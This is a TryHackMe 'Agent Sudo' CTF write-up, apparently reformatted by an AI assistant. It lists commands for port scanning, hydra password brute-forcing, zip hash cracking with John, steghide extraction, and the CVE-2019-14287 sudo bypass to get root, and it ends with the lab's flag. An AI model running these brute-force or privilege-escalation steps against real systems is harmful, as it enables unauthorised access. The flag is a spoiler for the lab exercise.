📝 CTF-Writeups/TryHackMe/AgentSudo/README.md

Here’s a cleaned-up Markdown version of your "Agent Sudo" CTF write-up:

# 🕵️ Agent Sudo - TryHackMe CTF Write-up

**Date:** 02 March 2025  
**Platform:** TryHackMe  
**CTF Type:** Boot2Root  
**Difficulty:** Beginner to Intermediate  

---

## 🔍 Enumeration

### Rustscan + Nmap
```bash
rustscan -a agentsudo.thm

nmap -sC -sV -oA agentsudo.thm

Open Ports:

    21 FTP (vsftpd 3.0.3)

    22 SSH (7.6p1 Linux)

    80 HTTP

🌐 Web Enumeration

No directories found initially.

Modified the User-Agent header to access a hidden page:

User-Agent: C

Accessed:

http://agentsudo.thm/agent_C_attention.php

Hidden Message Found

Attention chris,
Do you still remember our deal? Please tell agent J about the stuff ASAP.
Also, change your god damn password, it's weak!
- Agent R

🔐 SSH Brute Force

Found potential username: chris
Used hydra to brute-force FTP login:

hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://agentsudo.thm -t 4

Credentials Found:

    User: chris

    Password: crystal

🗜️ Cracking Zip Files
Convert zip to hashes

zip2john <file.zip> > hashes_for_john.txt

Crack with John the Ripper

john hashes_for_john.txt --wordlist=/usr/share/wordlists/rockyou.txt

Password: alien
📂 File Extraction
Extract contents with 7zip

The file contained base64-encoded content:

echo QXJlYTUx | base64 -d

Decoded Message: Area51
🖼️ Steganography
Extract hidden message from image

steghide extract -sf <filename>

Output file: messahe.txt
Password for steghide: hackerrules!
👥 User Enumeration

Found another user: james
SSH into James' account

ssh james@agentsudo.thm
# Password: hackerrules!

Download suspicious file

scp james@agentsudo.thm:/home/james/Alien_autspy.jpg .

🔎 Image Analysis

Googled Alien_autspy.jpg and found Roswell alien autopsy.
🛠️ Privilege Escalation

Discovered user james can run this:

(ALL, !root) /bin/bash

Used CVE-2019-14287 exploit:

sudo -u#-1 /bin/bash

→ Root access obtained!
🏁 Final Flag:

b53a02f55b57d4439e3341834d70c062

📚 References

    CVE-2019-14287 - sudo bypass
